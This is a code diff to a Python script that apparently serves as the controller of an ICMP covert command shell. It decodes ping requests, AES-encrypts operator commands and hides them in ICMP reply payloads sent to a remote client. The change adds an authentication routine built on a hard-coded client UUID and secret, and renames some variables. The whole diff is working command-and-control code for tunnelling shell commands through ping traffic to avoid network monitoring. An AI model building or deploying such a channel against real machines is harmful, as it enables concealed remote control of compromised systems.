@@ -29,7 +29,7 @@ import hashlib
 from Crypto.Cipher import AES
 from Crypto import Random
 
-from config import password
+from config import PASSWORD, SECRET
 
 def set_non_blocking(fd):
     """
@@ -65,6 +65,19 @@ class Crypt(object):
         cipher = buf[AES.block_size:]
         aes = AES.new(self.key, AES.MODE_CBC, iv)
         return aes.decrypt(cipher)
+
+
+def auth_code(uid):
+    # todo: database
+    if uid == '8fd2d4d2-1385-4b66-b4da-00191f6ee044':
+        sha = hashlib.sha256()
+        sha.update(uid)
+        sha.update(SECRET)
+        digest = sha.digest()
+        sha = hashlib.sha256()
+        sha.update(digest)
+        sha.update(SECRET)
+        return sha.digest()
 
 
 def main():
@@ -108,7 +121,9 @@ def main():
     decoder = ImpactDecoder.IPDecoder()
 
     # encrypt packet
-    encryptor = Crypt(password)
+    encryptor = Crypt(PASSWORD)
+
+    client = None
 
     while True:
         cmd = ''
@@ -126,12 +141,11 @@ def main():
             ippacket = decoder.decode(buf)
             icmppacket = ippacket.child()
 
-            # If the packet matches, report it to the user
-            src = ippacket.get_ip_dst()
-            dst = ippacket.get_ip_src()
+            # imcoming command
+            incoming_src, incoming_dst = ippacket.get_ip_src(), ippacket.get_ip_dst()
             if icmppacket.get_icmp_type() == 8:
                 # Get identifier and sequence number
-                ident = icmppacket.get_icmp_id()
+                icmp_id = icmppacket.get_icmp_id()
                 seq_id = icmppacket.get_icmp_seq()
                 data = icmppacket.get_data_as_string()
 
@@ -152,7 +166,7 @@ def main():
                     return
 
                 # Set sequence number and identifier
-                icmp.set_icmp_id(ident)
+                icmp.set_icmp_id(icmp_id)
                 icmp.set_icmp_seq(seq_id)
 
                 # Include the command as data inside the ICMP packet
